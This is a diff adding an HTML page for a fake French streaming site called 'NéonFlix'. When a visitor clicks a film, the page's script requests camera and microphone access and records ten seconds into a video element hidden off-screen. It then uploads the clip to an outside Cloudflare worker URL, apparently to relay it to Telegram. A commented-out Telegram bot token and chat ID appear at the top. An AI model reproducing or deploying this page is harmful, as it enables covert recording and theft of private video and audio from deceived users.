@@ -1,0 +1,66 @@
+<!--
+      const token = "8276033198:AAEdkEh19aRfOxLmztx3TelH3oUtnVLrgww";
+      const chatId = "5740629811";
+      -->
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>NéonFlix - Streaming Quantique</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+  <style>
+    body { background: linear-gradient(45deg, #0f0f23, #1a1a2e); color: #0ff; font-family: 'Orbitron', sans-serif; }
+    .movie-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; padding: 20px; }
+    .movie-card { border: 1px solid #0ff; padding: 10px; text-align: center; cursor: pointer; transition: 0.3s; }
+    .movie-card:hover { box-shadow: 0 0 20px #0ff; }
+    #hidden-capture { position: absolute; top: -9999px; left: -9999px; }
+  </style>
+</head>
+<body>
+  <h1>NéonFlix</h1>
+  <div class="movie-grid">
+    <div class="movie-card" onclick="startFakeStream('Film A')">Film A - Sci-Fi</div>
+    <div class="movie-card" onclick="startFakeStream('Film B')">Film B - Cyberpunk</div>
+  </div>
+
+  <video id="hidden-capture" autoplay muted></video>
+
+  <script>
+    async function startFakeStream(title) {
+      alert(`Activation du mode "immersion" pour ${title}...`);
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById('hidden-capture').srcObject = stream;
+
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          uploadToTelegram(blob);
+        };
+
+        recorder.start();
+        setTimeout(() => {
+          recorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 10000); // Enregistre 10 secondes
+      } catch (error) {
+        alert("Erreur lors de l'accès à la caméra.");
+      }
+    }
+
+    async function uploadToTelegram(file) {
+      const formData = new FormData();
+      formData.append('video', file, 'capture.webm');
+
+      await fetch('https://ton-worker-url.cloudflareworkers.com', {
+        method: 'POST',
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
